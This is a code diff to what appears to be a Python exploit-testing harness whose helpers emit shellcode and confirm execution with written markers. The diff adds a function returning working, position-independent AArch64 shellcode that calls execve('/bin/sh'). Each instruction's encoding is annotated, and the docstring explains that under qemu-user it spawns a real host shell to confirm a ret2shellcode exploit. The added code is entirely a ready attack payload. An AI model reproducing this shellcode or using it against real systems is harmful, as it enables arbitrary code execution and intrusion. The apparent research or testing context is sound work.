@@ -91,6 +91,25 @@ def write_marker(marker: bytes, code_addr: int) -> bytes:
     return code + marker
 
 
+def execve_binsh_aarch64() -> bytes:
+    """AArch64 execve("/bin/sh", NULL, NULL) -- 40 bytes, position-independent (builds "/bin/sh\\0"
+    on the stack via movz/movk and points x0 at it). Under qemu-user this spawns a REAL shell: qemu
+    relays the execve to the host, and /bin/sh is a host binary the kernel then runs natively -- so
+    a cross-arch ret2shellcode can be confirmed by an interactive shell, not only a written marker.
+    Encodings assembled against aarch64-linux-gnu-as and run under qemu-aarch64."""
+    return bytes.fromhex(
+        "010080d2"   # mov  x1, #0                 ; argv = NULL
+        "020080d2"   # mov  x2, #0                 ; envp = NULL
+        "e3458cd2"   # movz x3, #0x622f            ; "/b"
+        "23cdadf2"   # movk x3, #0x6e69, lsl #16   ; "in"
+        "e365cef2"   # movk x3, #0x732f, lsl #32   ; "/s"
+        "030de0f2"   # movk x3, #0x0068, lsl #48   ; "h\0"
+        "e30f1ff8"   # str  x3, [sp, #-16]!        ; push "/bin/sh"
+        "e0030091"   # mov  x0, sp                 ; x0 = &"/bin/sh"
+        "a81b80d2"   # mov  x8, #221               ; __NR_execve
+        "0100 00d4".replace(" ", ""))              # svc  #0
+
+
 def write_marker_aarch64(marker: bytes) -> bytes:
     """AArch64 write(1, marker, len); exit(93). Position-independent: `adr x1, marker` addresses the
     marker bytes appended after the fixed 7-instruction (28-byte) code, PC-relative, so the stub
